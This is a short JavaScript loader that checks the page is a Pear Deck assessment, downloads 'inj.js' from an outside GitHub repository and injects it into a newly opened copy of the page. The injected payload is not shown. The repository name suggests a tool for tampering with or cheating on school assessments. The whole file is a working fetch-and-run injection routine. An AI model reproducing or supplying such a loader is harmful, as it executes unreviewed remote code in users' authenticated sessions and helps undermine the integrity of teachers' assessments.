var base_url = "https://raw.githubusercontent.com/wrownd/peardeck-full/main";

async function main() {
  let url_regex = /https:\/\/assessment\.peardeck\.com.+/;
  if (!url_regex.test(window.location)) {
    alert("Error: Invalid URL.");
    return;
  }

  try {
    // Fetch the script from the provided URL
    let url = base_url + "/inj.js";
    let r2 = await fetch(url);
    let script_text = await r2.text();

    // Open a new window
    let w = window.open(window.location.href);
    
    // Ensure the new window is fully loaded before injecting the script
    w.onload = function () {
      // Create a new <script> element and inject the fetched script content
      let script = w.document.createElement("script");
      script.innerHTML = script_text;
      w.document.body.appendChild(script);
    };
  } catch (error) {
    console.error("Error fetching or injecting the script:", error);
  }
}

main();
